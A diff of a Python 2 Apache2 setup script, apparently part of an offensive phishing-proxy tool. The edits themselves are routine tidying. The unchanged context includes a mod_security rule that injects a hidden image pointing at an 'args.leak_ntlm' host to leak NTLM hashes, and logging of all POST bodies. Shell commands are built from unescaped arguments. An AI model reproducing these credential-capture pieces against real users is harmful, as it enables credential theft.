@@ -53,6 +53,7 @@ class Base:
     def check_apache2(self):
         if not self.check_file_exist("/etc/init.d/apache2"):
             print self.c_error + "Apache2 init script (/etc/init.d/apache2) not found!"
+            print self.c_info + "Install Apache2: apt -y install apache2"
             exit(1)
 
     def check_available_modules(self):
@@ -67,7 +68,7 @@ class Base:
             exit(1)
         if not self.check_file_exist("/etc/apache2/mods-available/security2.load"):
             print self.c_error + "Apache2 module: mod_security2 not installed!"
-            print self.c_info + "Install: apt install libapache2-mod-security2"
+            print self.c_info + "Install: apt -y install libapache2-mod-security2"
             exit(1)
         if not self.check_file_exist("/etc/apache2/mods-available/ssl.load"):
             print self.c_error + "Apache2 module: mod_ssl not installed!"
@@ -322,11 +323,11 @@ if __name__ == "__main__":
                                        args.leak_ntlm + "/img.png' width='0' height='0' /></body>|ni\"")
 
             http_config_file.write("\n\tSecRuleEngine On" +
-                                   "\n\tSecAuditEngine on" +
+                                   "\n\tSecAuditEngine On" +
                                    "\n\tSecAuditLog ${APACHE_LOG_DIR}/http-" + domain + "-audit.log" +
                                    "\n\tErrorLog ${APACHE_LOG_DIR}/http-" + domain + "-error.log" +
                                    "\n\tCustomLog ${APACHE_LOG_DIR}/http-" + domain + "-access.log combined" +
-                                   "\n\tSecRequestBodyAccess on" +
+                                   "\n\tSecRequestBodyAccess On" +
                                    "\n\tSecAuditLogParts ABIFHZ" +
                                    "\n\tSecDefaultAction \"nolog,noauditlog,allow,phase:2\"" +
                                    "\n\tSecRule REQUEST_METHOD \"^POST$\" \"chain,allow,phase:2,id:123\"" +
@@ -338,22 +339,25 @@ if __name__ == "__main__":
             http_config_file.write("\n</VirtualHost>\n")
 
     if schema == "https":
-        print Base.c_info + "Create SSL cert and key ..."
-        os.system("openssl req -nodes -newkey rsa:4096 -x509 -days 365 -keyout " + domain + ".key -out " + domain +
-                  ".pem " + "-subj '/C=" + args.country + "/ST=" + args.state + "/L=" + args.locality +
-                  "/O=" + args.organization + "/OU=" + args.organization_unit + "/CN=" + domain + "' > /dev/null 2>&1")
-        os.system("mv " + domain + ".pem /etc/ssl/certs/")
-        os.system("mv " + domain + ".key /etc/ssl/private/")
-        os.system("chmod 0600 /etc/ssl/private/" + domain + ".key")
-        os.system("openssl x509 -in /etc/ssl/certs/" + domain + ".pem -noout -text")
-
-        if Base.check_file_exist("/etc/ssl/certs/" + domain + ".pem") and Base.check_file_exist("/etc/ssl/private/" + domain + ".key"):
+        if not Base.check_file_exist("/etc/ssl/certs/" + domain + ".pem") or not Base.check_file_exist("/etc/ssl/private/" + domain + ".key"):
+            print Base.c_info + "Create SSL cert and key ..."
+            os.system("openssl req -nodes -new -x509 -days 365 -keyout " + domain + ".key -out " + domain +
+                      ".pem " + "-subj '/C=" + args.country + "/ST=" + args.state + "/L=" + args.locality +
+                      "/O=" + args.organization + "/OU=" + args.organization_unit + "/CN=" + domain +
+                      "' > /dev/null 2>&1")
+            os.system("mv " + domain + ".pem /etc/ssl/certs/")
+            os.system("mv " + domain + ".key /etc/ssl/private/")
+            os.system("chmod 0600 /etc/ssl/private/" + domain + ".key")
             if not args.quit:
-                print Base.c_info + "SSL cert: /etc/ssl/certs/" + domain + ".pem"
-                print Base.c_info + "SSL key: /etc/ssl/private/" + domain + ".key"
-        else:
-            print Base.c_error + "Can not create SSL cert and key"
-            exit(1)
+                os.system("openssl x509 -in /etc/ssl/certs/" + domain + ".pem -noout -text")
+
+            if Base.check_file_exist("/etc/ssl/certs/" + domain + ".pem") and Base.check_file_exist("/etc/ssl/private/" + domain + ".key"):
+                if not args.quit:
+                    print Base.c_info + "SSL cert: /etc/ssl/certs/" + domain + ".pem"
+                    print Base.c_info + "SSL key: /etc/ssl/private/" + domain + ".key"
+            else:
+                print Base.c_error + "Can not create SSL cert and key"
+                exit(1)
 
         with open(args.https_config, "a") as https_config_file:
             https_config_file.write("\n\n<IfModule mod_ssl.c>" +
@@ -398,16 +402,16 @@ if __name__ == "__main__":
                                        args.leak_ntlm + "/img.png' width='0' height='0' /></body>|ni\"")
 
             https_config_file.write("\n\t\tSecRuleEngine On" +
-                                    "\n\t\tSecAuditEngine on" +
+                                    "\n\t\tSecAuditEngine On" +
                                     "\n\t\tSecAuditLog ${APACHE_LOG_DIR}/https-" + domain + "-audit.log" +
                                     "\n\t\tErrorLog ${APACHE_LOG_DIR}/https-" + domain + "-error.log" +
                                     "\n\t\tCustomLog ${APACHE_LOG_DIR}/https-" + domain + "-access.log combined" +
-                                    "\n\t\tSecRequestBodyAccess on" +
+                                    "\n\t\tSecRequestBodyAccess On" +
                                     "\n\t\tSecAuditLogParts ABIFHZ" +
                                     "\n\t\tSecDefaultAction \"nolog,noauditlog,allow,phase:2\"" +
                                     "\n\t\tSecRule REQUEST_METHOD \"^POST$\" \"chain,allow,phase:2,id:123\"" +
                                     "\n\t\tSecRule REQUEST_URI \".*\" \"auditlog\"" +
-                                    "\n\t\tSSLEngine on" +
+                                    "\n\t\tSSLEngine On" +
                                     "\n\t\tSSLProxyEngine On" +
                                     "\n\t\tSSLCertificateFile /etc/ssl/certs/" + domain + ".pem" +
                                     "\n\t\tSSLCertificateKeyFile /etc/ssl/private/" + domain + ".key" +
@@ -429,5 +433,5 @@ if __name__ == "__main__":
         if schema == "https":
             print Base.c_info + "Apache2 https sites config: " + args.https_config
 
-    print Base.c_info + "Restart Apache2 server"
-    os.system("/etc/init.d/apache2 restart")
+    print Base.c_info + "Reload Apache2 server"
+    os.system("/etc/init.d/apache2 force-reload")
